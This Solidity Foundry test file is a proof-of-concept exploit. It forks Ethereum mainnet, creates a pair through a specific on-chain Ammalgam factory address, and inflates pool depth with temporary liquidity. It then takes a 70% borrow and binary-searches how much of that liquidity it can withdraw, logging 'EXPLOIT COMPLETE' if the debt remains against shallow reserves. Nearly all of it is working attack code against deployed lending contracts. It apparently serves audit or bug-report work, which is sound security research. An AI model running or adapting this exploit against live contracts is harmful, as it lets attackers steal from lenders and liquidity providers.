// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function underlyingTokens() external view returns (address, address);
}

contract MockERC20 {
    string public name; string public symbol; uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s, uint8 d) { name=n; symbol=s; decimals=d; }
    function mint(address to, uint256 amount) external { totalSupply+=amount; balanceOf[to]+=amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true;
    }
}

contract FlashLpMinDepthTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;
    IAmmalgamPair pair;
    MockERC20 assetX;
    MockERC20 assetY;
    uint256 constant SEED = 1e24;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        MockERC20 a = new MockERC20("A","A",18);
        MockERC20 b = new MockERC20("B","B",18);
        address p = IFactory(FACTORY).createPair(address(a), address(b));
        pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        assetX = MockERC20(px); assetY = MockERC20(py);
        assetX.mint(address(this), SEED * 500);
        assetY.mint(address(this), SEED * 500);
        assetX.transfer(p, SEED);
        assetY.transfer(p, SEED);
        pair.mint(address(this));
    }

    function test_minFlashThenMaxExtract() public {
        (uint112 rx0, uint112 ry0,) = pair.getReserves();
        uint256 borrowAmt = uint256(rx0) * 70 / 100;
        uint256 collAmt = (uint256(ry0) * borrowAmt / uint256(rx0)) * 500 / 100;

        // Find minimum flash multiplier (integer x of seed reserves)
        uint256 minFlashMult;
        for (uint256 mult = 1; mult <= 25; mult++) {
            uint256 snap = vm.snapshotState();
            bool ok = _tryBorrowWithFlash(mult, borrowAmt, collAmt);
            vm.revertToState(snap);
            if (ok) {
                minFlashMult = mult;
                console2.log("min flash mult", mult);
                break;
            }
        }
        require(minFlashMult > 0, "no flash size worked");

        // Execute at min flash + small buffer
        uint256 flashMult = minFlashMult + 1;
        (address atk, address hlp, uint256 flashLp) = _borrowWithFlash(flashMult, borrowAmt, collAmt);
        console2.log("using flash mult", flashMult);
        console2.log("flashLp", flashLp);

        (uint112 rxFlash,,) = pair.getReserves();
        console2.log("rx at peak", rxFlash);

        // Drain flash as much as possible
        IERC20 lpTok = IERC20(pair.tokens(0));
        uint256 remaining = flashLp;
        for (uint256 round; round < 40 && remaining > 0; round++) {
            uint256 lo = 0;
            uint256 hi = remaining;
            uint256 best;
            while (lo + 1 < hi) {
                uint256 mid = (lo + hi) / 2;
                if (_canBurn(hlp, mid)) { best = mid; lo = mid; }
                else hi = mid;
            }
            if (_canBurn(hlp, hi)) best = hi;
            if (best == 0) break;
            vm.startPrank(hlp);
            lpTok.transfer(address(pair), best);
            pair.burn(hlp);
            vm.stopPrank();
            remaining = lpTok.balanceOf(hlp);
        }

        (uint112 rx1,,) = pair.getReserves();
        uint256 debt = IERC20(pair.tokens(4)).balanceOf(atk);
        console2.log("rx final", rx1);
        console2.log("flash remaining", remaining);
        console2.log("flash removed pct", (flashLp - remaining) * 100 / flashLp);
        console2.log("debt", debt);
        console2.log("final util pct", borrowAmt * 100 / uint256(rx1));

        // Does final state still pass a hypothetical LTV check for a new identical borrow?
        // Compare depth: if rx1 ~= rx0, util ~70% — that borrow failed without flash.
        bool depthBackNearSeed = uint256(rx1) < uint256(rx0) * 150 / 100; // within 1.5x seed
        console2.log("depth near seed?", depthBackNearSeed ? 1 : 0);

        if (depthBackNearSeed && debt > 0) {
            console2.log("EXPLOIT COMPLETE: debt remains with near-seed depth");
        } else {
            console2.log("INCOMPLETE: cannot strip enough flash to restore seed-like depth");
            console2.log("residual flash / seed pct", remaining * 100 / SEED);
        }

        // Also: can we now take ANOTHER borrow that should fail? measure headroom
    }

    function _tryBorrowWithFlash(uint256 flashMult, uint256 borrowAmt, uint256 collAmt) internal returns (bool) {
        (address atk,,) = _borrowWithFlash(flashMult, borrowAmt, collAmt);
        return IERC20(pair.tokens(4)).balanceOf(atk) > 0;
    }

    function _borrowWithFlash(uint256 flashMult, uint256 borrowAmt, uint256 collAmt)
        internal
        returns (address atk, address hlp, uint256 flashLp)
    {
        (uint112 rx, uint112 ry,) = pair.getReserves();
        uint256 flashX = uint256(rx) * flashMult;
        uint256 flashY = uint256(ry) * flashMult;
        atk = address(uint160(uint256(keccak256(abi.encode(flashMult, "atk", borrowAmt)))));
        hlp = address(uint160(uint256(keccak256(abi.encode(flashMult, "hlp", borrowAmt)))));

        assetY.mint(atk, collAmt);
        assetX.mint(hlp, flashX);
        assetY.mint(hlp, flashY);

        vm.startPrank(atk);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(atk);
        vm.stopPrank();

        vm.startPrank(hlp);
        assetX.transfer(address(pair), flashX);
        assetY.transfer(address(pair), flashY);
        flashLp = pair.mint(hlp);
        vm.stopPrank();

        vm.prank(atk);
        try pair.borrow(atk, borrowAmt, 0, "") {} catch {}
    }

    function _canBurn(address who, uint256 amount) internal returns (bool ok) {
        if (amount == 0) return true;
        uint256 snap = vm.snapshotState();
        vm.startPrank(who);
        try IERC20(pair.tokens(0)).transfer(address(pair), amount) {
            try pair.burn(who) { ok = true; } catch { ok = false; }
        } catch { ok = false; }
        vm.stopPrank();
        vm.revertToState(snap);
    }
}
